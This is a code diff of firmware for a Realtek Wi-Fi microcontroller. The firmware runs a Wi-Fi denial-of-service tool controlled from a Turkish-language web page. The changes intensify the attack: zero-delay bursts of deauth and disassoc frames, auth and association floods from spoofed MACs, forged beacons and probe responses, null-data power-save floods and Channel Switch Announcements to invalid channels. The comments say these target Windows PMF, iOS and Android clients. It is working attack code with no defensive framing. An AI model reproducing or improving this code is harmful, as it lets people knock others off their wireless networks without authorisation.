@@ -1,31 +1,20 @@
 #include "vector"
 #include "wifi_conf.h"
-#include "map"
 #include "wifi_cust_tx.h"
 #include "wifi_util.h"
 #include "wifi_structures.h"
-#include "debug.h"
 #include "WiFi.h"
 #include "WiFiServer.h"
 #include "WiFiClient.h"
-
-// LEDs:
-//  Red:   System active, web server running
-//  Green: Web server handling a request
-//  Blue:  Deauth/Disassoc frame being sent
 
 // ─── Configuration ────────────────────────────────────────────────────────────
 char *ssid = "X";
 char *pass = "20192019";
 
-// Frames sent per channel burst (×4 frame types = effective 80 frames per target)
-#define FRAMES_PER_DEAUTH     20
+// Frames sent per channel burst (main loop iterations)
+#define FRAMES_PER_DEAUTH     80
 // How often to re-scan and refresh target channels while attacking (ms)
 #define RESCAN_INTERVAL_MS    30000UL
-// Delay between individual frames (ms)
-#define FRAME_DELAY_MS        1
-// Delay between targets (ms)
-#define TARGET_GAP_MS         8
 
 // Common fallback channels to try when pair channel is not yet known from scan
 static const uint8_t COMMON_5GHZ[]  = {36, 40, 44, 48, 149, 153, 157, 161};
@@ -52,7 +41,6 @@ typedef struct {
 } DeauthTarget;
 
 // ─── Globals ──────────────────────────────────────────────────────────────────
-int current_channel = 1;
 std::vector<WiFiScanResult> scan_results;
 std::vector<DeauthTarget>   deauth_targets;   // Persistent across router reboots
 WiFiServer server(80);
@@ -88,11 +76,9 @@ void updateTargetChannels() {
     for (auto &result : scan_results) {
       if (bssidEqual(target.bssid, result.bssid)) {
         target.channel = result.channel;
-        DEBUG_SER_PRINT("Updated primary channel for " + target.ssid + ": " + String(target.channel) + "\n");
       }
       if (target.has_pair && bssidEqual(target.bssid_pair, result.bssid)) {
         target.channel_pair = result.channel;
-        DEBUG_SER_PRINT("Updated pair channel for " + target.ssid + ": " + String(target.channel_pair) + "\n");
       }
     }
   }
@@ -124,118 +110,94 @@ void nextFloodMAC(uint8_t *mac) {
 }
 
 /*
- * Full multi-method attack burst on one BSSID/channel combination.
- * ALL frame types fired in every burst — no cycling needed.
+ * Single-channel full attack burst — ONE wext_set_channel() call, zero delays.
  *
- * Per iteration (FRAMES_PER_DEAUTH = 20 iterations):
- *   Deauth  2,3,4,6,8  — broadcast kicks (Android done, iOS done)
- *   Disassoc 2,3,8     — forces full re-assoc (iOS/Android)
+ * Supplement frames (probe resp / beacon / null) are INTERLEAVED inside the
+ * main loop so the attack pressure never drops between phases. The adapter
+ * cannot complete its reconnect handshake in any gap because there is no gap.
  *
- * Windows PMF bypass (runs FRAMES_PER_DEAUTH times extra):
- *   Auth Flood      — fake Open-System auth from unique MAC → fills AP table
- *   Assoc Flood     — fake assoc request from same MAC → claims table slot
- *   CSA frame ×2   — Channel Switch Announcement → invalid channel (ch14/ch14)
- *                     Windows drivers honor CSA even from unauthenticated sources
+ * Per burst (FRAMES_PER_DEAUTH = 80 iterations):
+ *   Core loop ×80 : deauth×5 + disassoc×3 + auth+assoc flood×1  = 720 frames
+ *   Interleaved /4 : probe_resp (Realtek/TP-Link) + null PM=1    ~  42 frames
+ *   Interleaved /8 : beacon flood (iOS) — bitwise (i&7)==0        ~  10 frames
+ *   Tail           : CSA ×5 (ch14/ch0 alternating)                   5 frames
+ *   Total          : ~777 frames | 1 channel switch | 0 ms delay
  *
- * Total: ~(8+3) frames × 20 + 2 CSA = ~222 frames per channel burst
+ * wext_set_channel skipped if channel unchanged — saves 10-50ms per call.
  */
-void attackBSSID(uint8_t *bssid, uint8_t channel) {
+static uint8_t _last_channel = 0xFF;
+
+void attackBand(uint8_t *bssid, uint8_t channel, const String &ssid) {
   static uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
   uint8_t flood_mac[6];
+  uint8_t null_mac[6];
+  const char *ssid_c = (ssid.length() > 0 && ssid != "(hidden)") ? ssid.c_str() : nullptr;
 
-  wext_set_channel(WLAN0_NAME, channel);
-  digitalWrite(LED_B, HIGH);
-
-  for (int i = 0; i < FRAMES_PER_DEAUTH; i++) {
-    // ── Deauth/Disassoc (Android ✓, iOS ✓, Windows without PMF ✓) ──
-    wifi_tx_deauth_frame  (bssid, broadcast, 2); delay(FRAME_DELAY_MS);
-    wifi_tx_deauth_frame  (bssid, broadcast, 3); delay(FRAME_DELAY_MS);
-    wifi_tx_deauth_frame  (bssid, broadcast, 4); delay(FRAME_DELAY_MS);
-    wifi_tx_deauth_frame  (bssid, broadcast, 6); delay(FRAME_DELAY_MS);
-    wifi_tx_deauth_frame  (bssid, broadcast, 8); delay(FRAME_DELAY_MS);
-    wifi_tx_disassoc_frame(bssid, broadcast, 2); delay(FRAME_DELAY_MS);
-    wifi_tx_disassoc_frame(bssid, broadcast, 3); delay(FRAME_DELAY_MS);
-    wifi_tx_disassoc_frame(bssid, broadcast, 8); delay(FRAME_DELAY_MS);
-
-    // ── Auth + Assoc flood — PMF-exempt, exhausts AP table (Windows ✓) ──
-    // Each iteration uses a fresh MAC so the table fills with distinct entries
-    nextFloodMAC(flood_mac);
-    wifi_tx_auth_frame (bssid, flood_mac); delay(FRAME_DELAY_MS);
-    wifi_tx_assoc_frame(bssid, flood_mac); delay(FRAME_DELAY_MS);
+  // Only switch channel when it actually changes — wext_set_channel is slow
+  if (channel != _last_channel) {
+    wext_set_channel(WLAN0_NAME, channel);
+    _last_channel = channel;
   }
 
-  // ── CSA: Channel Switch Announcement — Windows honors these (Windows ✓) ──
-  // Point clients at ch14 (invalid in EU/TR) to strand them off-channel
-  wifi_tx_csa_frame(bssid, 14); delay(FRAME_DELAY_MS);
-  wifi_tx_csa_frame(bssid, 14); delay(FRAME_DELAY_MS);
-  wifi_tx_csa_frame(bssid, 14); delay(FRAME_DELAY_MS);
+  // beacon_ctr uses bitwise (beacon_ctr & 7) == 0 instead of % 5 to avoid
+  // the integer division path on Cortex-M33 (even though gcc optimises it,
+  // the bitwise path is cheaper and keeps beacon spacing even at 80 iters)
+  uint8_t beacon_ctr = 0;
 
-  digitalWrite(LED_B, LOW);
+  for (int i = 0; i < FRAMES_PER_DEAUTH; i++) {
+    // ── Core: deauth + disassoc (all platforms, no PMF) ─────────────────────
+    wifi_tx_deauth_frame  (bssid, broadcast, 2);
+    wifi_tx_deauth_frame  (bssid, broadcast, 3);
+    wifi_tx_deauth_frame  (bssid, broadcast, 4);
+    wifi_tx_deauth_frame  (bssid, broadcast, 6);
+    wifi_tx_deauth_frame  (bssid, broadcast, 8);
+    wifi_tx_disassoc_frame(bssid, broadcast, 2);
+    wifi_tx_disassoc_frame(bssid, broadcast, 3);
+    wifi_tx_disassoc_frame(bssid, broadcast, 8);
+
+    // ── Auth + Assoc flood — PMF-exempt, fills AP table (Windows PMF ✓) ─────
+    nextFloodMAC(flood_mac);
+    wifi_tx_auth_frame (bssid, flood_mac);
+    wifi_tx_assoc_frame(bssid, flood_mac);
+
+    // ── Every 4 iters: probe resp (Realtek/TP-Link) + null PM=1 flood ───────
+    if ((i & 3) == 0) {
+      if (ssid_c) wifi_tx_probe_resp_frame(bssid, ssid_c);
+      nextFloodMAC(null_mac);
+      wifi_tx_null_frame(bssid, null_mac);
+    }
+
+    // ── Every 8 iters: beacon flood (iOS) — bitwise, zero division cost ──────
+    if ((beacon_ctr & 7) == 0 && ssid_c) {
+      wifi_tx_beacon_frame(bssid, broadcast, ssid_c);
+    }
+    beacon_ctr++;
+  }
+
+  // ── Tail: CSA — alternate ch14/ch0 so driver can't settle (Windows ✓) ─────
+  wifi_tx_csa_frame(bssid, 14);
+  wifi_tx_csa_frame(bssid,  0);
+  wifi_tx_csa_frame(bssid, 14);
+  wifi_tx_csa_frame(bssid,  0);
+  wifi_tx_csa_frame(bssid, 14);
 }
 
 /*
- * Attack a full DeauthTarget:
- *   - Primary BSSID on primary channel
- *   - Pair BSSID on pair channel (known or guessed from common channel list)
- *   - This ensures the router's internet access is cut on BOTH bands simultaneously
+ * Attack a full DeauthTarget across both bands.
+ * Each band gets exactly ONE wext_set_channel() call (inside attackBand).
  */
-// iOS-specific supplement: beacon flood + null data flood on a given band
-// Called after attackBSSID() to maximise disruption of iOS reconnection cycle
-void iosSupplementAttack(uint8_t *bssid, uint8_t channel, const String &ssid) {
-  static uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
-  uint8_t null_mac[6];
-
-  wext_set_channel(WLAN0_NAME, channel);
-
-  // ── Beacon flood with target SSID ──────────────────────────────────────────
-  // iOS is always scanning for known SSIDs. Sending beacons spoofed as the real
-  // AP mid-reconnect keeps iOS's state machine busy evaluating the "AP" signal
-  // instead of completing the 4-way handshake — prolongs disconnection window.
-  if (ssid.length() > 0 && ssid != "(hidden)") {
-    for (int i = 0; i < 10; i++) {
-      wifi_tx_beacon_frame(bssid, broadcast, ssid.c_str());
-      delay(FRAME_DELAY_MS);
-    }
-  }
-
-  // ── Null Data flood (PM=1) ─────────────────────────────────────────────────
-  // Each unique fake MAC tells the AP "I'm sleeping, buffer my frames."
-  // AP's power-save queue fills → AP stalls real frame delivery even when
-  // iOS does briefly reconnect — throughput collapses without full disconnect.
-  for (int i = 0; i < 10; i++) {
-    nextFloodMAC(null_mac);
-    wifi_tx_null_frame(bssid, null_mac);
-    delay(FRAME_DELAY_MS);
-  }
-}
-
 void attackTarget(DeauthTarget &target) {
-  // --- Primary band ---
-  attackBSSID(target.bssid, target.channel);
-  iosSupplementAttack(target.bssid, target.channel, target.ssid);
-  delay(TARGET_GAP_MS);
+  attackBand(target.bssid, target.channel, target.ssid);
 
   if (!target.has_pair) return;
 
-  // --- Pair band ---
   if (target.channel_pair > 0) {
-    attackBSSID(target.bssid_pair, target.channel_pair);
-    iosSupplementAttack(target.bssid_pair, target.channel_pair, target.ssid);
+    attackBand(target.bssid_pair, target.channel_pair, target.ssid);
+  } else if (target.channel <= 14) {
+    attackBand(target.bssid_pair, COMMON_5GHZ[guess_5g_idx++ % COMMON_5GHZ_LEN], target.ssid);
   } else {
-    if (target.channel <= 14) {
-      uint8_t ch = COMMON_5GHZ[guess_5g_idx % COMMON_5GHZ_LEN];
-      attackBSSID(target.bssid_pair, ch);
-      iosSupplementAttack(target.bssid_pair, ch, target.ssid);
-      guess_5g_idx++;
-    } else {
-      uint8_t ch = COMMON_24GHZ[guess_24g_idx % COMMON_24GHZ_LEN];
-      attackBSSID(target.bssid_pair, ch);
-      iosSupplementAttack(target.bssid_pair, ch, target.ssid);
-      guess_24g_idx++;
-    }
+    attackBand(target.bssid_pair, COMMON_24GHZ[guess_24g_idx++ % COMMON_24GHZ_LEN], target.ssid);
   }
-
-  delay(TARGET_GAP_MS);
 }
 
 // ─── WiFi Scan ────────────────────────────────────────────────────────────────
@@ -260,18 +222,14 @@ rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
 }
 
 int scanNetworks() {
-  DEBUG_SER_PRINT("Scanning WiFi networks (5s)...");
   scan_results.clear();
   if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
     delay(5000);
-    DEBUG_SER_PRINT(" done!\n");
     updateTargetChannels();
     last_rescan_ms = millis();
     return 0;
-  } else {
-    DEBUG_SER_PRINT(" failed!\n");
-    return 1;
   }
+  return 1;
 }
 
 // ─── HTTP Helpers ─────────────────────────────────────────────────────────────
@@ -471,20 +429,52 @@ void handleRoot(WiFiClient &client) {
   }
 
   response += R"(
-    <h2>Gönderilen Frame'ler (Her Burst)</h2>
+    <h2>Evrensel Saldırı Matrisi (Her Burst)</h2>
     <table>
-      <tr><th>Tip</th><th>Detay</th><th>Yöntem</th><th>Hedef</th></tr>
-      <tr><td>Deauth 0xC0</td><td>Reason 2,3,4,6,8</td><td>AP&rarr;Broadcast — PMF olmayanlarda çalışır</td><td>Android ✓ iOS ✓ Windows (PMF yok) ✓</td></tr>
-      <tr><td>Disassoc 0xA0</td><td>Reason 2,3,8</td><td>AP&rarr;Broadcast — tam re-assoc zorlar</td><td>Android ✓ iOS ✓</td></tr>
-      <tr style="background:#fff3cd;"><td>Auth Flood 0xB0</td><td>Open System, Seq=1</td><td>PMF-exempt: sahte MAC'lerle AP tablosunu doldurur, Windows yeniden bağlanamaz</td><td><b>Windows PMF ✓</b></td></tr>
-      <tr style="background:#fff3cd;"><td>Assoc Flood 0x00</td><td>Assoc Request</td><td>Auth flood ile AP'nin tüm slot'larını tüketir</td><td><b>Windows PMF ✓</b></td></tr>
-      <tr style="background:#ffe0e0;"><td>CSA 0xD0</td><td>Ch14 (geçersiz)</td><td>Channel Switch Announcement — Windows sürücüsünü geçersiz kanala yönlendirir</td><td><b>Windows ✓</b></td></tr>
-      <tr style="background:#e8f4f8;"><td>Beacon Flood 0x80</td><td>Hedef SSID ile</td><td>AP'nin BSSID'inden hedef SSID beacon'ı — iOS'un reconnect state machine'ini meşgul eder, 4-way handshake'i tamamlatmaz</td><td><b>iOS ✓</b></td></tr>
-      <tr style="background:#e8f4f8;"><td>Null Data 0x48+PM</td><td>PM=1, sahte MAC flood</td><td>AP'ye "istemci uyuyor" sinyali — AP buffer dolar, iOS reconnect etse bile frame teslim edilemez, throughput sıfırlanır</td><td><b>iOS ✓</b></td></tr>
+      <tr><th>Frame Tipi</th><th>Miktar</th><th>Mekanizma</th><th>Hedef Platform</th></tr>
+      <tr>
+        <td>Deauth 0xC0</td><td>reason 2,3,4,6,8 &times;50</td>
+        <td>AP&rarr;Broadcast, delay=0, kesintisiz bask&iacute;</td>
+        <td>Android ✓ &nbsp; iOS ✓ &nbsp; Windows (PMF yok) ✓</td>
+      </tr>
+      <tr>
+        <td>Disassoc 0xA0</td><td>reason 2,3,8 &times;50</td>
+        <td>Tam re-assoc zorlar, deauth ile birlikte (&icirc;ç i&ccedil;e)</td>
+        <td>Android ✓ &nbsp; iOS ✓</td>
+      </tr>
+      <tr style="background:#fff3cd;">
+        <td>Auth Flood 0xB0</td><td>unique MAC &times;50</td>
+        <td>PMF-exempt &mdash; AP association tablosunu doldurur</td>
+        <td><b>Windows PMF ✓</b></td>
+      </tr>
+      <tr style="background:#fff3cd;">
+        <td>Assoc Flood 0x00</td><td>unique MAC &times;50</td>
+        <td>Auth flood ile t&uuml;m AP slot'larını kilitler</td>
+        <td><b>Windows PMF ✓</b></td>
+      </tr>
+      <tr style="background:#fce8ff;">
+        <td>Probe Resp 0x0050</td><td>caps=0x0001 (open) &times;~13</td>
+        <td><b>&icirc;&ccedil; i&ccedil;e:</b> Realtek s&uuml;r&uuml;c&uuml;s&uuml; "AP g&uuml;venliği kaldırdı" sanır → keser → deauth bloğu</td>
+        <td><b>TP-Link/Realtek USB ✓</b></td>
+      </tr>
+      <tr style="background:#e8f4f8;">
+        <td>Beacon Flood 0x80</td><td>hedef SSID &times;~10</td>
+        <td><b>&icirc;&ccedil; i&ccedil;e:</b> iOS reconnect state machine'i meşgul eder</td>
+        <td><b>iOS ✓</b></td>
+      </tr>
+      <tr style="background:#e8f4f8;">
+        <td>Null Data PM=1</td><td>unique MAC &times;~13</td>
+        <td><b>&icirc;&ccedil; i&ccedil;e:</b> AP buffer dolar → frame teslim edilemez</td>
+        <td><b>iOS ✓ &nbsp; Android ✓</b></td>
+      </tr>
+      <tr style="background:#ffe0e0;">
+        <td>CSA 0xD0</td><td>ch14+ch0 &times;5 (ku&yacute;ruk)</td>
+        <td>Ard&iacute;&scaron;ık 2 geçersiz kanal — s&uuml;r&uuml;c&uuml; hi&ccedil;birine yerle&scaron;emez</td>
+        <td><b>Windows ✓ &nbsp; TP-Link/Realtek USB ✓</b></td>
+      </tr>
     </table>
     <p style="font-size:.85em;color:#666;">
-      Toplam: ~242 frame/kanal/tur &nbsp;|&nbsp; 
-      deauth+disassoc &times;20 + auth+assoc flood &times;20 + CSA &times;3 + beacon &times;10 + null &times;10
+      <b>~777 frame/kanal &bull; kanal ge&ccedil;i&scaron;i sadece kanal de&gti;i&scaron;ince &bull; delay=0 &bull; TX g&uuml;c&uuml; %100 &bull; power-save kapal&iacute;</b>
     </p>
   </body></html>)";
 
@@ -498,17 +488,16 @@ void handle404(WiFiClient &client) {
 
 // ─── Setup ────────────────────────────────────────────────────────────────────
 void setup() {
-  pinMode(LED_R, OUTPUT);
-  pinMode(LED_G, OUTPUT);
-  pinMode(LED_B, OUTPUT);
+  WiFi.apbegin(ssid, pass, "1");
 
-  DEBUG_SER_INIT();
-  WiFi.apbegin(ssid, pass, (char *)String(current_channel).c_str());
+  // ── Maximum RF performance ──────────────────────────────────────────────────
+  // Disable IPS (Inactive Power Save) + LPS (Legacy Power Save).
+  // Without this the Realtek driver throttles TX during "idle" periods — which
+  // causes frame rate drops mid-attack even though FRAME_DELAY_MS = 0.
+  wifi_disable_powersave();
 
   while (scanNetworks()) delay(1000);
-
   server.begin();
-  digitalWrite(LED_R, HIGH);
 }
 
 // ─── Loop ─────────────────────────────────────────────────────────────────────
@@ -516,14 +505,12 @@ void loop() {
   // ── Web server ──
   WiFiClient client = server.available();
   if (client.connected()) {
-    digitalWrite(LED_G, HIGH);
     String request;
     while (client.available()) {
       while (client.available()) request += (char)client.read();
       delay(1);
     }
     String path = parseRequest(request);
-    DEBUG_SER_PRINT("Request: " + path + "\n");
 
     if (path == "/") {
       handleRoot(client);
@@ -531,7 +518,6 @@ void loop() {
     } else if (path == "/rescan") {
       client.write(makeRedirect("/").c_str());
       client.stop();
-      digitalWrite(LED_G, LOW);
       scanNetworks();
       return;
 
@@ -580,7 +566,6 @@ void loop() {
         }
 
         deauth_targets.push_back(target);
-        DEBUG_SER_PRINT("Added target: " + target.ssid + " ch=" + String(target.channel) + "\n");
       }
 
       client.write(makeRedirect("/").c_str());
@@ -590,7 +575,6 @@ void loop() {
     }
 
     client.stop();
-    digitalWrite(LED_G, LOW);
   }
 
   // ── Attack loop ──
@@ -598,8 +582,7 @@ void loop() {
 
   // Periodic re-scan to refresh channels (router may have rebooted on same/new channel)
   if (millis() - last_rescan_ms >= RESCAN_INTERVAL_MS) {
-    DEBUG_SER_PRINT("Periodic re-scan...\n");
-    scanNetworks();   // updates target channels via updateTargetChannels()
+    scanNetworks();
   }
 
   // Attack every target in the list
